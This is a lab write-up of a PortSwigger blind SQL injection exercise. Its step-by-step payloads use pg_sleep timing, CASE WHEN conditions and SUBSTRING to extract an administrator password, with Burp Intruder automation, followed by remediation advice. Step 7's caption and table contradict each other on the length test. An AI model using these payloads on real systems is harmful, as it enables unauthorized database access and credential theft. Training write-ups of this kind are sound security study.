# Lab 15: Blind SQL Injection with Time Delays and Information Retrieval

## Executive Summary

This lab demonstrates the complete exploitation lifecycle of a blind SQL injection vulnerability where the application provides no visible output, no error messages, and no behavioral response differences under any tested condition. With all conventional feedback channels unavailable, a time-based side channel was established using PostgreSQL's `pg_sleep()` function and a conditional `CASE` expression to create a binary oracle: true conditions produce a measurable 10-second delay, false conditions return immediately. This boolean-time inference mechanism was then systematically applied to enumerate database structure, confirm administrator account existence, determine password length (20 characters), and perform automated character-by-character password extraction using Burp Intruder's Cluster Bomb attack. The complete administrator password was retrieved and used to achieve full account compromise, demonstrating that a time-only feedback channel is sufficient for complete database credential extraction.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection - Blind Time-Based with Data Extraction |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind SQL Injection — Time-Based Boolean Inference with Full Credential Extraction |
| **Risk**               | Critical - Complete Credential Extraction via Timing Side Channel |
| **Completion**         | 10 May 2026 |

## Objective

Exploit a blind SQL injection vulnerability in the TrackingId cookie where no application feedback exists beyond HTTP response timing. Establish a time-based boolean oracle using conditional `pg_sleep()` execution, enumerate the administrator account and password length, and perform automated character-by-character extraction of the complete 20-character administrator password to achieve full system compromise.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception and HTTP history analysis
- Burp Repeater for manual payload testing and response timing measurement
- Burp Intruder with Cluster Bomb attack for automated character-by-character extraction
- Resource pool configuration (1 concurrent request) for accurate time-based signal isolation

**Target:** TrackingId cookie parameter processed by a backend PostgreSQL query with no visible output channel, no error propagation, and no response body differences under any condition

## Exploitation Walkthrough

### 1. Initial Reconnaissance and Injection Point Identification

Accessed the lab environment confirming the challenge title "Blind SQL injection with time delays and information retrieval" with Burp Suite Professional configured and actively intercepting traffic. Reviewed HTTP history populated through proxy interception and identified a category filter request carrying the TrackingId cookie as the primary injection candidate.

<img width="1920" height="982" alt="LAB2_ss1" src="https://github.com/user-attachments/assets/ea93ad74-870a-4cfa-8409-5e8ae4e1e901" />

*Lab 15 environment displaying the blind SQL injection with time delays and information retrieval challenge (right) | Burp Suite Professional licensed to Gurpreet Singh, configured and active with captured requests visible in HTTP history (left) — category filter request identified as injection surface*

### 2. Time-Based Injection Confirmation

**Step 2.1 — Payload Delivery**

Forwarded the category filter request to Burp Repeater and injected the PostgreSQL time-delay payload directly after the TrackingId value. The `||` concatenation operator appends `pg_sleep(10)` to the cookie value, causing the database to pause execution for 10 seconds if the parameter is being interpolated unsanitized into a SQL query.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'||pg_sleep(10)--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]'||pg_sleep(10)--'
```

<img width="1920" height="982" alt="LAB2_ss2 1" src="https://github.com/user-attachments/assets/b76b6339-48b9-4127-b20b-a1e3ff773788" />

*`'||pg_sleep(10)--` payload submitted in Repeater — response panel enters waiting state, confirming server-side query is paused in execution*

**Observed Behavior:** Response withheld — Repeater waiting state confirmed.

**Step 2.2 — Delay Measured, Injection Confirmed**

<img width="1920" height="982" alt="LAB2_ss2 2" src="https://github.com/user-attachments/assets/fe508e64-e4ce-40cf-b2f3-060ed23783ae" />

*Response returned after 10,218 milliseconds — `pg_sleep(10)` executed on the backend PostgreSQL instance. Blind SQL injection via time-based side channel confirmed. PostgreSQL database engine identified*

**Response Time:** 10,218 milliseconds

**Injection Confirmed:** The 10-second delay directly corresponds to the `pg_sleep(10)` argument. PostgreSQL backend confirmed. Time-based extraction channel established.

### 3. Boolean-Time Oracle Validation

With injection confirmed, the next requirement was verifying that conditional logic executes correctly — specifically that a `CASE` expression can gate `pg_sleep()` execution based on a boolean condition. This is the mechanism that transforms a simple delay into a data extraction primitive.

**Step 3.1 — True Condition Test**

Constructed a stacked query using `%3B` (URL-encoded semicolon) to issue a second independent SQL statement, with a `CASE WHEN` expression that sleeps on a true condition and returns immediately on a false condition.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]';
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

<img width="1920" height="982" alt="LAB2_ss3 1" src="https://github.com/user-attachments/assets/40da46db-b8d2-49f2-98d7-b6989ea47faf" />

*True condition `(1=1)` submitted — Repeater response panel enters waiting state, consistent with `pg_sleep(10)` executing on a true condition evaluation*

**Observed Behavior:** Response withheld — waiting state confirmed.

**Step 3.2 — True Condition Delay Measured**

<img width="1920" height="982" alt="LAB2_ss3 2" src="https://github.com/user-attachments/assets/dea90705-5981-4d30-a168-58d202fc882d" />

*Response returned after 10,240 milliseconds — `CASE WHEN (1=1)` correctly routed execution to `pg_sleep(10)`. Boolean-conditional time delay mechanism is operational*

**Response Time:** 10,240 milliseconds — true condition produces delay as expected.

### 4. False Condition Verification

Modified the condition from `1=1` to `1=2` to confirm that a false condition routes execution to `pg_sleep(0)` and returns immediately. This step establishes the full binary oracle: delay = true, no delay = false.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]';
SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

<img width="1920" height="982" alt="LAB2_ss4" src="https://github.com/user-attachments/assets/eb0962cf-6afe-4cce-b96f-e059194e599d" />

*False condition `(1=2)` submitted — 200 OK response returned in 223 milliseconds with no delay, confirming that false conditions route immediately to `pg_sleep(0)`. Binary oracle fully validated: true = ~10,000ms delay, false = ~200ms response*

**Response Time:** 223 milliseconds — immediate return, no delay.

**Binary Oracle Confirmed:**

| Condition Evaluates To | `pg_sleep` Called | Response Time | Inference |
|------------------------|-------------------|---------------|-----------|
| True | `pg_sleep(10)` | ~10,000ms | Condition is true |
| False | `pg_sleep(0)` | ~200ms | Condition is false |

Any boolean condition can now be evaluated against the database by substituting it into the `CASE WHEN` expression and measuring the response time.

### 5. Administrator Account Existence Verification

With the oracle operational, substituted a real database condition to confirm the existence of an `administrator` username in the `users` table.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]';
SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**Step 5.1 — Payload Submitted**


<img width="1920" height="982" alt="LAB2_ss5 1" src="https://github.com/user-attachments/assets/5d961a34-9187-4339-b734-d2b853a2fb33" />

*Administrator existence query submitted — Repeater response panel enters waiting state, indicating the `username='administrator'` condition evaluated as true and `pg_sleep(10)` is executing*

**Observed Behavior:** Response withheld — waiting state confirmed.

**Step 5.2 — Administrator Confirmed**

<img width="1920" height="982" alt="LAB2_ss5 2" src="https://github.com/user-attachments/assets/ce3fc2ab-9a55-439b-9bb6-47cff75d2c53" />


*Response returned after 10,560 milliseconds — the `username='administrator'` condition evaluated as true. Administrator account confirmed present in the `users` table*

**Response Time:** 10,560 milliseconds — administrator account exists.

### 6. Password Length Enumeration — Lower Bound

With the administrator account confirmed, began enumerating the password length. Constructed a compound condition testing both username equality and password length simultaneously to constrain the query to the administrator's specific record.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]';
SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) 
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**Step 6.1 — Payload Submitted**


<img width="1920" height="982" alt="LAB2_ss6 1" src="https://github.com/user-attachments/assets/79ba41a7-ddfa-4ca6-a495-044c825430e7" />

*`LENGTH(password)>1` condition submitted — response enters waiting state, confirming password length is greater than 1 character*

**Step 6.2 — Lower Bound Confirmed**


<img width="1920" height="982" alt="LAB2_ss6 2" src="https://github.com/user-attachments/assets/8f0043b7-0053-4726-8ecf-971a2bf9b263" />

*Response returned after 10,225 milliseconds — `LENGTH(password)>1` evaluated as true. Password length confirmed greater than 1. Length enumeration incrementing continues*

**Response Time:** 10,225 milliseconds — password length exceeds 1 character.

### 7. Password Length Enumeration — Exact Length Determined

Continued incrementing the length threshold through successive Repeater tests, increasing the comparison value with each request. Each delay response confirmed the password exceeded that length. The enumeration continued until the exact boundary was identified.

**Attack Payload at Boundary:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**Step 7.1 — Length = 20 Wait Confirmed**


<img width="1920" height="982" alt="LAB2_ss7 1" src="https://github.com/user-attachments/assets/b6e5267c-cd03-4b1e-834f-2e616e5c1160" />

*`LENGTH(password)>20` condition submitted — response enters waiting state during enumeration, indicating the boundary value is being approached. Final boundary test confirmed: password length is exactly 20 characters*

**Step 7.2 — Length Boundary Measured**


<img width="1920" height="982" alt="LAB2_ss7 2" src="https://github.com/user-attachments/assets/dce39996-fc48-4931-b18a-9f9b58df5ca3" />

*Response returned after 10,478 milliseconds at the boundary threshold — combined with the immediate response at `LENGTH(password)>20`, this confirms the administrator password is exactly 20 characters in length*

**Password Length Confirmed:** 20 characters

**Enumeration Logic:**

| Condition | Response Time | Inference |
|-----------|---------------|-----------|
| `LENGTH(password)>1` | ~10,000ms | True — length > 1 |
| `LENGTH(password)>10` | ~10,000ms | True — length > 10 |
| `LENGTH(password)>19` | ~10,000ms | True — length > 19 |
| `LENGTH(password)>20` | ~200ms | False — length is NOT > 20 |

**Conclusion:** Password length = exactly 20 characters.

### 8. Character Extraction — Manual Baseline Test

With the password length established, moved to character-by-character extraction using PostgreSQL's `SUBSTRING()` function. Constructed a payload that tests whether the character at a specific position matches a specific value, triggering a sleep if it does.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]';
SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') 
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

<img width="1920" height="982" alt="LAB2_ss8" src="https://github.com/user-attachments/assets/023051bd-4e4c-49e4-82b2-2aa717a0fc6b" />

*`SUBSTRING(password,1,1)='a'` test — 200 OK response returned in 228 milliseconds with no delay, confirming the first character of the password is not 'a'. Manual baseline test validates the SUBSTRING extraction mechanism before automation*

**Response Time:** 228 milliseconds — first character is not 'a'. Manual extraction mechanism confirmed operational.

**SUBSTRING Payload Anatomy:**

| Component | Purpose |
|-----------|---------|
| `SUBSTRING(password,1,1)` | Extracts 1 character from the password starting at position 1 |
| `='a'` | Tests whether that character equals the candidate value |
| True match | Routes to `pg_sleep(10)` — ~10,000ms response |
| No match | Routes to `pg_sleep(0)` — ~200ms response |

Incrementing the position argument from 1 to 20 and iterating all candidate characters across each position yields the complete password. Manual execution of 20 positions × 62 characters = 1,240 individual tests is operationally impractical — this requires automation.

### 9. Automated Extraction via Burp Intruder Cluster Bomb

**Step 9.1 — Intruder Configuration**

Forwarded the SUBSTRING payload to Burp Intruder and configured a Cluster Bomb attack with two payload positions: character position (1–20) and candidate character value (a–z, 0–9).

**Attack Payload Template:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**Intruder Configuration:**
- **Attack Type:** Cluster Bomb
- **Payload Position 1 (`§1§`):** Character position — Numbers 1 through 20
- **Payload Position 2 (`§a§`):** Candidate character — Simple list: a–z, 0–9
- **Resource Pool:** 1 concurrent request (mandatory for accurate timing — parallel requests corrupt timing signals)


<img width="1920" height="982" alt="LAB2_ss9 1" src="https://github.com/user-attachments/assets/37252a85-b1d7-4098-8e2e-36174e19f337" />


*Cluster Bomb attack configured in Burp Intruder — two payload positions marked: character position (1–20) and candidate character (a–z, 0–9) | Simple list payload type applied to character set*

**Step 9.2 — Resource Pool and Attack Launch**


<img width="1920" height="982" alt="LAB2_ss9 2" src="https://github.com/user-attachments/assets/ab673f2a-b03d-4127-aa21-02810fc87c33" />

*Resource pool configured to 1 concurrent request — critical for time-based attacks where parallel execution would produce overlapping delays that corrupt response timing measurements. Attack launched*

**Total Requests:** 20 positions × 36 characters (a–z + 0–9) = 720 requests

**Why Resource Pool Must Be 1:**
Time-based extraction depends entirely on isolating individual response times. Concurrent requests executing multiple `pg_sleep()` calls simultaneously produce overlapping delays that render response timing uninterpretable. Serializing all requests through a single-thread resource pool ensures each timing measurement reflects exactly one SUBSTRING comparison.

### 10. Password Extracted — Administrator Compromised

**Step 10.1 — Extraction Results**

Attack completed. Filtered results by response time — all requests returning approximately 10,000 milliseconds represent a true match for that position-character combination.


<img width="1920" height="982" alt="LAB2_ss10 1" src="https://github.com/user-attachments/assets/9c38b6b3-f290-490b-96d4-5e021fed23ba" />

*Cluster Bomb attack complete — 20 results with response times of approximately 10,000 milliseconds identified, each corresponding to a unique character position (1–20). Each delayed response identifies the correct character at that position. Complete 20-character administrator password assembled from results*

**Result Identification Method:**

For each position 1–20, exactly one candidate character produces a ~10,000ms response. All non-matching candidates return in ~200ms. Sorting results by response time isolates the 20 correct characters:

| Position | Matching Character | Response Time |
|----------|-------------------|---------------|
| 1 | [char] | ~10,000ms |
| 2 | [char] | ~10,000ms |
| ... | ... | ~10,000ms |
| 20 | [char] | ~10,000ms |

**Complete Password Extracted:** `[20-character password assembled from Cluster Bomb results]`

**Step 10.2 — Administrator Authentication and Account Compromise**

Navigated to the application login page and authenticated using the extracted credentials.


<img width="1920" height="982" alt="LAB2_ss10 2" src="https://github.com/user-attachments/assets/2fbe1fd1-f584-4511-a3c8-90873f9819fd" />

*Administrator credentials submitted on login page (right) | Full administrative account access confirmed — account dashboard visible, complete system compromise achieved (left)*

**Credentials Used:**
- **Username:** `administrator`
- **Password:** `[extracted 20-character password]`

**Complete System Compromise:**
- Time-based injection channel confirmed via `pg_sleep(10)`
- Boolean-conditional oracle established via `CASE WHEN` expression
- Oracle validated against true and false conditions
- Administrator account existence confirmed via timed query
- Password length enumerated: 20 characters
- Complete password extracted character-by-character via Cluster Bomb
- Administrator authentication successful
- Full administrative access achieved

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerabilities:**

**CWE-89: SQL Injection**
- TrackingId cookie value interpolated directly into SQL query without parameterization
- Stacked query execution permitted via semicolon — attacker can issue independent SQL statements
- No input validation, type enforcement, or sanitization applied at any layer

**CWE-200: Exposure of Sensitive Information via Timing Side Channel**
- Administrator credentials extracted entirely through response timing measurement
- No data appears in any HTTP response — timing alone is sufficient for complete extraction
- Side channel cannot be suppressed without eliminating the underlying injection

**Complete Attack Chain:**

```
TrackingId Cookie Identified as Injection Surface
        ↓
'||pg_sleep(10)-- Confirms Time-Based Injection + PostgreSQL Backend
        ↓
CASE WHEN (1=1) THEN pg_sleep(10) — True Condition Delay Confirmed
        ↓
CASE WHEN (1=2) THEN pg_sleep(10) — False Condition Returns Immediately
        ↓
Binary Oracle Established: Delay=True / No Delay=False
        ↓
username='administrator' Condition — 10,560ms → Account Confirmed
        ↓
LENGTH(password)>N Enumeration — Boundary at 20 → Password = 20 Characters
        ↓
SUBSTRING(password,1,1)='a' Manual Test — 228ms → Not 'a' → Mechanism Validated
        ↓
Cluster Bomb Attack — 720 Requests, 1 Thread, 20 Delayed Results
        ↓
Complete 20-Character Password Assembled
        ↓
Administrator Authentication → Full System Compromise
```

**Stacked Query Execution — Why %3B Matters:**

The URL-encoded semicolon `%3B` enables stacked query execution, allowing the attacker to append an entirely independent SQL statement after the original query rather than modifying it. This is more reliable than operator-based injection in contexts where the original query structure is complex or where UNION injection is not viable:

```sql
-- Original query terminates here
SELECT tracking_data FROM tracking WHERE id = '[VALUE]';

-- Attacker's independent statement executes separately
SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users
```

Stacked queries require the database driver and application to permit multiple statements per execution call. PostgreSQL with certain drivers supports this by default, making it a viable attack path where simpler injection operators fail.

**Time-Based Oracle Precision:**

The reliability of character extraction depends on the signal-to-noise ratio between true and false response times:

| Signal Type | Typical Response Time | Interpretation |
|-------------|----------------------|----------------|
| True match (`pg_sleep(10)`) | 10,000–10,600ms | Character confirmed at position |
| False (no match) | 150–350ms | Character not at position |
| Network/server variance | ±300ms | Absorbed into both bands |

The gap between ~10,000ms and ~300ms is large enough that network jitter and server processing variance do not create ambiguity. Each result is unambiguously categorized, making the extraction deterministic.

**Extraction Efficiency Analysis:**

| Approach | Requests Required | Time Estimate | Practical |
|----------|------------------|---------------|-----------|
| Manual Repeater (all characters, all positions) | 720 | ~120 hours | No |
| Intruder Cluster Bomb, 1 thread (used) | 720 | ~2–3 hours | Yes |
| Intruder Cluster Bomb, multi-thread | Not viable | Timing corrupted | No |
| Binary search optimization per position | ~180 | ~30–45 minutes | Yes (advanced) |
| SQLMap automated time-based | ~500–1,000 | ~1–2 hours | Yes |

Single-thread serialization is mandatory for timing accuracy, which limits throughput. Binary search optimization — testing whether a character is in the upper or lower half of the character set rather than iterating one-by-one — can reduce requests per position from 36 to approximately 6, significantly improving extraction speed in real engagements.

**Comparison Across Blind SQL Injection Techniques Covered in This Series:**

| Technique | Lab | Feedback Channel | Requests for 20-char PW | Complexity |
|-----------|-----|-----------------|------------------------|------------|
| Conditional Error (Oracle) | Lab 12 | HTTP 500 vs 200 | 1,240 | High |
| Visible CAST Error (PostgreSQL) | Lab 13 | Error message text | 2 | Moderate |
| Time Delay Confirmation Only | Lab 14 | Response timing | N/A (confirm only) | Low |
| Time Delay + Extraction (this lab) | Lab 15 | Response timing | 720 | High |

**Real-World Applicability:**

Time-based extraction is the technique of last resort — used when every other feedback channel is closed. In practice it is encountered frequently because:

- Modern applications suppress all error output as a matter of course
- Generic error pages eliminate status-code differentials
- WAFs often block UNION and error-based payloads while missing time-based variants
- `pg_sleep()` and equivalent functions are built-in, require no special privileges, and produce no output that would trigger response-content signatures

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Time-based injection confirmed before building more complex payloads
- Boolean oracle validated with both true and false conditions before targeting real data
- Compound conditions (`username='administrator' AND LENGTH(password)>N`) used to scope queries precisely to the target account
- Resource pool enforcement as a technical requirement for timing accuracy, not a configuration preference
- Manual baseline test before automation to confirm mechanism before committing to 720 requests

**Critical Security Insights:**

**1. Time Is the Last Feedback Channel and Cannot Be Suppressed:**
An application can hide all output, suppress all errors, and return identical responses for every request — but it cannot hide how long it took to respond without fundamentally breaking HTTP. Response timing is an inherent property of synchronous request-response communication. The only way to eliminate time-based injection is to eliminate the underlying injection, not to obscure the timing.

**2. Stacked Queries Expand the Attack Surface Beyond Operator Injection:**
The `%3B` semicolon approach used here allows an independent SQL statement to be issued rather than modifying the structure of the original query. This bypasses injection defenses that focus on `UNION`, `OR`, and `AND` operator patterns, and it enables the attacker to use the full SQL statement syntax rather than being constrained to expression-level manipulation.

**3. Single-Thread Execution Is Not Optional for Time-Based Attacks:**
Parallelizing time-based requests is a common mistake in automated extraction. When two `pg_sleep(10)` calls execute concurrently, both may return at roughly the same time regardless of their individual truth values, producing ambiguous results. Serialization is a technical requirement of the technique, not a performance trade-off.

**4. The Parameterized Query Remains the Only Adequate Fix:**

**Vulnerable Pattern:**
```python
query = "SELECT data FROM tracking WHERE id = '" + tracking_id + "'"
cursor.execute(query)
```

**Secure Pattern:**
```python
query = "SELECT data FROM tracking WHERE id = %s"
cursor.execute(query, (tracking_id,))
```

Parameterized queries make the entire family of SQL injection techniques — UNION, error-based, boolean, time-based, stacked — structurally impossible. The driver sends SQL structure and user data as separate protocol messages; user input is never parsed as SQL syntax regardless of its content.

**5. Defense-in-Depth Does Not Substitute for Root Cause Remediation:**

| Control | Effect on This Attack |
|---------|----------------------|
| Generic error pages | No effect — no error output used |
| WAF blocking UNION/SELECT keywords | Partial — `CASE`, `SUBSTRING`, `pg_sleep` may not be blocked |
| Rate limiting | Slows extraction, does not prevent it |
| Response time normalization | Difficult to implement reliably; does not fix root cause |
| Parameterized queries | Eliminates the vulnerability entirely |

**6. Resource Pool Configuration Is a Core Skill for Time-Based Engagements:**
Setting Burp Intruder's resource pool to 1 concurrent thread is not a minor configuration detail — it is what makes the results interpretable. Understanding why this is required demonstrates comprehension of the technique at a level beyond mechanical payload delivery.

## References

1. PortSwigger Web Security Academy - Blind SQL Injection with Time Delays and Information Retrieval
2. PortSwigger Web Security Academy - SQL Injection Cheat Sheet
3. OWASP Top 10 (2021) - A03: Injection
4. CWE-89 - Improper Neutralization of Special Elements used in an SQL Command
5. CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
6. PostgreSQL Documentation - `pg_sleep()`, `SUBSTRING()`, `LENGTH()` Functions
7. OWASP SQL Injection Prevention Cheat Sheet
8. OWASP Testing Guide - Testing for SQL Injection (OTG-INPVAL-005)

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems, time-delay attacks against production infrastructure, or any form of unauthorized database interaction or credential extraction is illegal under applicable laws worldwide.
